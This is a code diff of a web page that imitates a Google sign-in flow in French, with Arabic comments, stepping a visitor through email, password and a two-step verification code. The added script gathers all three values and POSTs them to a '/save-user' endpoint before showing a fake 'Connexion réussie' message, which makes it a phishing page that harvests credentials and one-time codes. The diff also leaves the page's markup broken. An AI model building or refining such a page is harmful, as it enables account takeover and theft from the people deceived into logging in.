@@ -163,131 +163,65 @@
       font-weight: bold;
       text-align: center;
       margin-top: 40px;
-    }
-  </style>
-</head>
-<body>
+  const step1Form = document.getElementById('step1Form');
+  const step2Form = document.getElementById('step2Form');
+  const step3Form = document.getElementById('step3Form');
 
-  <div class="container">
-    <div class="top-content">
-      <!-- الشعار -->
-      <div class="logo">
-        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-      </div>
+  const step1Div = document.getElementById('step1');
+  const step2Div = document.getElementById('step2');
+  const step3Div = document.getElementById('step3');
 
-      <!-- الخطوة 1: البريد الإلكتروني -->
-      <form id="step1Form">
-        <div id="step1">
-          <div class="title">Connexion</div>
-          <div class="description">
-            Utilisez votre compte Google. Il sera ajouté à cet appareil et disponible pour d'autres applis Google.
-          </div>
-          <a href="#" class="learn-more">En savoir plus sur l'utilisation de votre compte</a>
+  const emailInput = document.getElementById('emailInput');
+  const passwordInput = document.getElementById('passwordInput');
+  const codeInput = document.getElementById('codeInput');
+  const userEmailDisplay = document.getElementById('userEmailDisplay');
+  const successMsg = document.getElementById('success-message');
 
-          <div class="input-group">
-            <input type="email" id="emailInput" required />
-            <label>Adresse e-mail ou téléphone</label>
-          </div>
+  // 1. الانتقال من البريد إلى كلمة السر
+  step1Form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    userEmailDisplay.textContent = emailInput.value;
+    step1Form.style.display = 'none';
+    step2Div.style.display = 'block';
+  });
 
-          <a href="#" class="forgot-link">Adresse e-mail oubliée ?</a>
+  // 2. الانتقال من كلمة السر إلى كود التحقق
+  step2Form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    step2Form.style.display = 'none';
+    step3Div.style.display = 'block';
+  });
 
-          <a href="#" class="create-account">Créer un compte</a>
+  // 3. إرسال جميع البيانات المجمعة (البريد، كلمة السر، الكود) إلى السيرفر دفعة واحدة
+  step3Form.addEventListener('submit', function(e) {
+    e.preventDefault();
 
-          <div class="bottom-actions">
-            <button type="submit">Suivant</button>
-          </div>
-        </div>
-      </form>
+    const data = {
+      email: emailInput.value,
+      password: passwordInput.value,
+      code: codeInput.value
+    };
 
-      <!-- الخطوة 2: كلمة السر -->
-      <form id="step2Form">
-        <div id="step2">
-          <div class="title">Bienvenue</div>
-          <div class="user-chip" id="userEmailDisplay">email@gmail.com</div>
-
-          <div class="input-group" style="margin-top: 10px;">
-            <input type="password" id="passwordInput" required />
-            <label>Saisissez votre mot de passe</label>
-          </div>
-
-          <label class="show-password">
-            <input type="checkbox" onclick="togglePassword()" /> Afficher le mot de passe
-          </label>
-
-          <div class="bottom-actions">
-            <button type="submit">Suivant</button>
-          </div>
-        </div>
-      </form>
-
-      <!-- الخطوة 3: كود التحقق -->
-      <form id="step3Form">
-        <div id="step3">
-          <div class="title">Validation en deux étapes</div>
-          <div class="description" style="margin-bottom: 20px;">
-            Un code de vérification a été envoyé à votre appareil.
-          </div>
-
-          <div class="input-group">
-            <input type="text" id="codeInput" required />
-            <label>Saisissez le code</label>
-          </div>
-
-          <div class="bottom-actions">
-            <button type="submit">Vérifier</button>
-          </div>
-        </div>
-      </form>
-
-      <!-- رسالة النجاح -->
-      <div id="success-message">Connexion réussie</div>
-    </div>
-  </div>
-
-  <script>
-    const step1Form = document.getElementById('step1Form');
-    const step2Form = document.getElementById('step2Form');
-    const step3Form = document.getElementById('step3Form');
-
-    const step1Div = document.getElementById('step1');
-    const step2Div = document.getElementById('step2');
-    const step3Div = document.getElementById('step3');
-
-    const emailInput = document.getElementById('emailInput');
-    const passwordInput = document.getElementById('passwordInput');
-    const userEmailDisplay = document.getElementById('userEmailDisplay');
-    const successMsg = document.getElementById('success-message');
-
-    // الإنتقال من البريد إلى كلمة السر
-    step1Form.addEventListener('submit', function(e) {
-      e.preventDefault();
-      userEmailDisplay.textContent = emailInput.value;
-      step1Form.style.display = 'none';
-      step2Div.style.display = 'block';
-    });
-
-    // الإنتقال من كلمة السر إلى كود التحقق
-    step2Form.addEventListener('submit', function(e) {
-      e.preventDefault();
-      step2Form.style.display = 'none';
-      step3Div.style.display = 'block';
-    });
-
-    // إتمام العملية
-    step3Form.addEventListener('submit', function(e) {
-      e.preventDefault();
+    fetch('/save-user', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    })
+    .then(response => {
       step3Form.style.display = 'none';
       successMsg.style.display = 'block';
+    })
+    .catch(err => {
+      console.error('Erreur:', err);
     });
+  });
 
-    function togglePassword() {
-      if (passwordInput.type === "password") {
-        passwordInput.type = "text";
-      } else {
-        passwordInput.type = "password";
-      }
+  function togglePassword() {
+    if (passwordInput.type === "password") {
+      passwordInput.type = "text";
+    } else {
+      passwordInput.type = "password";
     }
-  </script>
-
-</body>
-</html>
+  }
